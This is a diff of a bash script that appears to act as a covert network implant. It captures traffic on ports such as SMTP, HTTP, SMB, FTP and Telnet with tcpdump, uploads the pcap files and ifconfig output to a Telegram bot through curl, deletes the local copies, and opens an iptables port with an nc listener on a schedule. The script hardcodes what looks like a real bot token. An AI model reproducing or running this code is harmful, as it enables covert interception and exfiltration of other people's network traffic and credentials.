@@ -33,6 +33,12 @@ if [ $? -eq 0 ]; then
 	ifconfig_output_file="ifconfig_$current_date.txt"
 	touch $ifconfig_output_file
 	ifconfig > $ifconfig_output_file
+
+	#Port forwarding
+	#f_port=3000
+	#echo "Enabling portforwarding on port $f_port..."
+	#iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
+	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Port forwading enabled: $public_ip":"$f_port"		
 	
 	# Send report via telegram
 	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
@@ -46,57 +52,53 @@ if [ $? -eq 0 ]; then
 	curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
 	rm "$filepath1"
 	rm "$filepath3"
-	echo "Start intercepting..."
-	while true
-	do
-		h=$(date +"%H:%M")
-		#Schedule of 30 minutes
-		port=4000
-		start="14:00"
-		stop="14:30"
-		if [ "$h" == $start ]; then
-			echo "Enabling portforwarding on port $port..."
-			iptables -A INPUT -p tcp --dport $port -j ACCEPT
-			echo "Start listening..."
-			nc -l -p $port
-			#send notify 
-			curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip":"$port"
-			while [ "$h" != $stop ];
-			do
-				h=$(date +"%H:%M")
-			done
-		else
+	h=$(date +"%H:%M")
+	#Schedule of 30 minutes
+	port=4000
+	start="14:00"
+	stop="14:30"
+	if [ "$h" == $start ]; then
+		echo "Enabling portforwarding on port $port..."
+		iptables -A INPUT -p tcp --dport $port -j ACCEPT
+		echo "Start listening..."
+		nc -l -p $port
+		#send notify 
+		curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip":"$port"
+		while [ "$h" != $stop ];
+		do
 			h=$(date +"%H:%M")
-			echo "Not listening..."
-		fi
-
-		# Max size of file .pcap
-		MAX_FILE_SIZE=200000000  # 200MB in byte
-		# Name of file 
-		tcpdump_output_file="intercept$current_date.pcap"
-		# Filter to apply at tcpdump
-		filter_tcpdump="(tcp port 25 or tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 445 or tcp port 137 or tcp port 139 or tcp port 21 or tcp port 23 or udp port 69 or udp portrange 10000-20000)"
-		# Start tcpdump to capture traffic and save all on file .pcap
-		tcpdump -i any -s 0 -w "$tcpdump_output_file" "$filter_tcpdump" &
-		# Save PID of tcpdump process
-		tcpdump_pid=$!
-		# Cicle while to check size of file .pcap
-		while true; do
-		    # Obtain current size of file .pcap
-		    FILE_SIZE=$(stat -c%s "$tcpdump_output_file")
-		    # If the size > 200mb stop tcpdump process 
-		    if [ "$FILE_SIZE" -ge "$MAX_FILE_SIZE" ]; then
-		        kill -SIGINT "$tcpdump_pid"
-		        break
-		    fi
-		    # Else wait 1 second before to check size of file .pcap
-		    sleep 1
 		done
-		filepath2=$tcpdump_output_file
-		# Send file via telegram
-		curl -F chat_id="$chat_id" -F document=@"$filepath2" "https://api.telegram.org/bot$token/sendDocument"
-		rm "$filepath2"
+	else
+		h=$(date +"%H:%M")
+		echo "Not listening..."
+	fi
+	echo "Start intercepting..."
+	# Max size of file .pcap
+	MAX_FILE_SIZE=200000000  # 200MB in byte
+	# Name of file 
+	tcpdump_output_file="intercept$current_date.pcap"
+	# Filter to apply at tcpdump
+	filter_tcpdump="(tcp port 25 or tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 445 or tcp port 137 or tcp port 139 or tcp port 21 or tcp port 23 or udp port 69 or udp portrange 10000-20000)"
+	# Start tcpdump to capture traffic and save all on file .pcap
+	tcpdump -i any -s 0 -w "$tcpdump_output_file" "$filter_tcpdump" &
+	# Save PID of tcpdump process
+	tcpdump_pid=$!
+	# Cicle while to check size of file .pcap
+	while true; do
+	    # Obtain current size of file .pcap
+	    FILE_SIZE=$(stat -c%s "$tcpdump_output_file")
+	    # If the size > 200mb stop tcpdump process 
+	    if [ "$FILE_SIZE" -ge "$MAX_FILE_SIZE" ]; then
+	        kill -SIGINT "$tcpdump_pid"
+	        break
+	    fi
+	    # Else wait 1 second before to check size of file .pcap
+	    sleep 1
 	done
+	filepath2=$tcpdump_output_file
+	# Send file via telegram
+	curl -F chat_id="$chat_id" -F document=@"$filepath2" "https://api.telegram.org/bot$token/sendDocument"
+	rm "$filepath2"
 else
   	echo "Internet not ok"
 fi
